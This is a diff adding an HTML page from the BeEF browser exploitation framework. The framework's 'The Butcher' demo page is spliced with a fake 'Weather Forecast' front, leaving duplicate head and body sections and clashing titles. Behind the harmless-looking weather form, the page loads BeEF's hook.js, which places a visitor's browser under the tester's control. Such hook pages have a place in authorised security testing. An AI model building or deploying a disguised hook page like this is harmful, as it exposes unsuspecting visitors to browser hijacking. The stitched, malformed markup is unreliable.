@@ -1,0 +1,65 @@
+<!--
+    Copyright (c) 2006-2023 Wade Alcorn - wade@bindshell.net
+    Browser Exploitation Framework (BeEF) - http://beefproject.com
+    See the file 'doc/COPYING' for copying permission
+-->
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+   "http://www.w3.org/TR/html4/loose.dtd">
+
+<html lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<title>The Butcher</title>
+
+	<link rel="stylesheet" type="text/css" href="butch.css" />
+</head>
+<head>
+	<title>Weather Forecast</title>
+	<link rel="stylesheet" type="text/css" href="WeatherFake/style.css">
+</head>
+<body>
+	<h1>Weather Forecast</h1>
+	<form id="weather-form">
+		<label for="city">Enter city:</label>
+		<input type="text" id="city" name="city" required>
+		<button type="submit">Get forecast</button>
+	</form>
+	<div id="weather-container"></div>
+
+	<script src="WeatherFake/app.js"></script>
+</body>
+<body>
+<script src="jquery-1.12.4.min.js"></script>
+<script>
+
+	function showfriends() {
+		$("#hamper").hide();
+		$("#friends").show();
+	}
+
+	function showHamper() {
+		$("#friends").hide();
+		$("#hamper").show();
+	}
+
+</script>
+<script src="../../hook.js"></script>
+<div id="content">
+	<!-- Awesome Beef Images from: http://www.flickr.com/photos/bulle_de/4657658048/ and http://www.flickr.com/photos/dinesarasota/3944042189/ -->
+	<div id="logo">
+		<img src="top.jpg" alt="The Butcher" height="200" width="200" />
+	</div>
+	<div id="stuff">
+		<div class="bigger">
+Welcome to The Weather Forecast, a fun and exciting website!
+		</div>
+		<div class="normal">
+			
+		
+			</div>
+		</div>
+
+</div>
+</body>
+</html>
+
